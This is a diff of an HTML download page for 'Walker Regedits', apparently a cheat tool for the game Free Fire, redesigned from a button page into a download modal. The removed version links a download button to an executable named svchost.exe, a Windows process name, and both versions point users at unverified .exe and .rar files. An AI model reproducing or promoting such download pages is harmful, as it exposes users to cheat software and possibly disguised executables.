@@ -1,124 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Walker Regedits</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Download Center</title>
     <style>
         body {
-            background-image: url('https://raw.githubusercontent.com/DarkForceFREEFIRE/darkforcefreefire/main/myst.jpg');
-            background-size: cover;
-            background-position: center;
-            color: #e0e0e0;
-            font-family: 'Segoe UI', sans-serif;
-            text-align: center;
-            padding-top: 0px;
+            font-family: Segoe UI, Arial, Helvetica, sans-serif;
+            padding: 0;
             margin: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            background-image: url("/assets/img/bg.png");
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
         }
 
-        h1 {
-            font-size: 48px;
-            font-weight: bold;
-            margin-bottom: 30px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        .modal {
+            display: block;
+            position: fixed;
+            z-index: 10;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            opacity: 0; /* Start invisible */
+            transition: opacity 0.5s ease; /* Fade in transition */
+        }
+
+        .modal-content {
+            position: relative;
+            background-color: #2A2A2A;
+            margin: auto;
+            padding: 0;
+            top: 50%;
+            transform: translate(0, -50%) scale(0.7); /* Start scaled down */
+            transition: transform 0.3s ease, opacity 0.3s ease; /* Scale and fade in */
+            width: 600px;
+            height: 250px;
+            border-radius: 10px;
+            overflow: hidden;
+            color: white;
+            opacity: 0; /* Start invisible */
+        }
+
+        .modal-body {
+            padding: 2px 16px;
+        }
+
+        .modal-footer {
+            padding: 2px 16px;
+            height: 600px;
+            background-color: #1F1F1F;
+            color: white;
+            display: block;
+            text-align: center;
         }
 
         .button {
-            background-color: rgba(255, 255, 255, 0.1); /* Transparent background */
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 15px 25px;
-            margin-top: 20px;
+            padding: 10px 20px;
+            margin: 8px;
+            background-color: #50C8FF;
+            color: rgb(0, 0, 0);
+            text-align: center;
+            text-decoration: none;
+            border-radius: 5px;
+            border: 1px solid #7a7a7a;
             cursor: pointer;
-            border-radius: 10px;
-            font-size: 20px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6); /* Add shadow */
-            backdrop-filter: blur(10px); /* Add a blur effect */
-            transition: box-shadow 0.3s ease, transform 0.3s ease; /* Smooth transition */
+            font-size: 16px;
+            display: inline-block;
+            transition: background-color 0.3s ease, transform 0.2s ease; /* Button hover effect */
         }
 
-        .button-social {
-            background-color: rgba(255, 255, 255, 0.1); /* Transparent background */
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 10px 20px; /* Smaller padding */
-            margin-top: 20px;
-            margin-right: 20px;
-            margin-left: 20px;
-            cursor: pointer;
-            border-radius: 10px;
-            font-size: 16px; /* Smaller font size */
-            backdrop-filter: blur(10px); /* Add a blur effect */
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6); /* Add shadow */
-            transition: box-shadow 0.3s ease, transform 0.3s ease; /* Smooth transition */
+        .button:hover {
+            background-color: #00aeff;
+            transform: scale(1.05); /* Scale up on hover */
         }
 
-        .button:hover, .button-social:hover {
-            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.8); /* Stronger shadow on hover */
-            transform: scale(1.05); /* Slightly enlarge on hover */
+        /* Show modal and content */
+        .modal.show {
+            opacity: 1; /* Fully visible */
+        }
+        .button-large {
+        padding:8px 0px; /* Increase padding for a larger button */
+        width: 450px;
+        font-size: 15px; /* Adjust font size as needed */
+        background-color: #50C8FF;
+        -webkit-text-fill-color: #1b1b1b;
+        
+    /* width: 200px; */ /* Uncomment to set a fixed width */
         }
 
-        .button-group {
-            margin-top: 30px;
+        .modal-content.show {
+            transform: translate(0, -50%) scale(1); /* Scale to normal size */
+            opacity: 1; /* Fully visible */
         }
-
-        @media (max-width: 600px) {
-            body {
-                padding: 20px;
-            }
-
-            h1 {
-                font-size: 36px;
-            }
-
-            .button {
-                font-size: 18px;
-                padding: 12px 20px;
-            }
-
-            .button-group {
-                flex-direction: column;
-            }
-
-            .button-social {
-                font-size: 14px;
-                padding: 8px 15px;
-                margin-top: 15px;
-            }
-        }
+        
     </style>
 </head>
 <body>
-    <h1>Walker Regedits v1.2</h1>
-    <button class="button" onclick="playSoundAndRedirect('panel')">Download Application</button>
-    
-    <div class="button-group">
-        <button class="button-social" onclick="playSoundAndRedirect('discord')">Download Free Fire</button>
-        <button class="button-social" onclick="playSoundAndRedirect('whatsapp')">Requirements</button>
+
+    <div class="modal" id="downloadModal">
+        <div class="modal-content" id="modalContent">
+            <div class="modal-body">
+                <h1>Download Center</h1>
+                <p>Download Walker Regedits Csharp, C++ and Python based Panels here</p>
+            </div>
+
+            <div class="modal-footer">
+                <a href="https://github.com/DarkForceFREEFIRE/WalkerREGEDITS/raw/refs/heads/main/Walker%20Xitres.exe" class="button" download>Download CSharp</a>
+                <a href="https://nightly.link/Rectify11/Installer/suites/10728067738/artifacts/1898434868" class="button" download>Download C++</a>
+                <a href="#" class="button" onclick="confirmDownload('https://status.rectify11.net', 'Python')">Download Python</a>
+                <a href="#" class="button button-large">Recommended files for Csharp and C++</a> <!-- New Button -->
+            </div>
+        </div>
+
     </div>
 
-    <audio id="click-sound" src="https://github.com/DarkForceFREEFIRE/darkforcefreefire/raw/main/Windows%20Background.wav" preload="auto"></audio>
-
-    <script type="text/javascript">
-        function playSoundAndRedirect(destination) {
-            var sound = document.getElementById('click-sound');
-            sound.play();
-            
-            setTimeout(function() {
-                if (destination === 'panel') {
-                    window.location.href = "https://github.com/DarkForceFREEFIRE/Codes/raw/main/svchost.exe";
-                } else if (destination === 'discord') {
-                    window.location.href = "https://dl.cdn.freefiremobile.com/live/package/FreeFire.apk";
-                } else if (destination === 'whatsapp') {
-                    window.location.href = "https://download2358.mediafire.com/xmnii873i1sgc_Ab0SFNGpmTDH7i3S8QTg324FW1lSfuXTJ5YmBU77ZKCMifvLjVR3wfbRRGQ9B8jMwSBrxw0qpPphfpnKsnEl6HGOJ6fATOCVQEQRBlkd2MB0EKicgNy6_Tct5GF1vHbWsKbwXAdYNZN6c-Fmqm3zyQrPl6SwEuNsc/a91j62nm1t47udx/Requerimientos.rar";
-                }
-            }, 500); // Delay redirection to allow sound to play
+    <script>
+        function confirmDownload(url, language) {
+            alert(`${language} based Panel is Coming soon.`);
         }
+
+        // Function to show the modal
+        function showModal() {
+            document.getElementById('downloadModal').classList.add('show');
+            document.getElementById('modalContent').classList.add('show');
+        }
+
+        // Call showModal on page load
+        window.onload = showModal;
     </script>
+
 </body>
 </html>
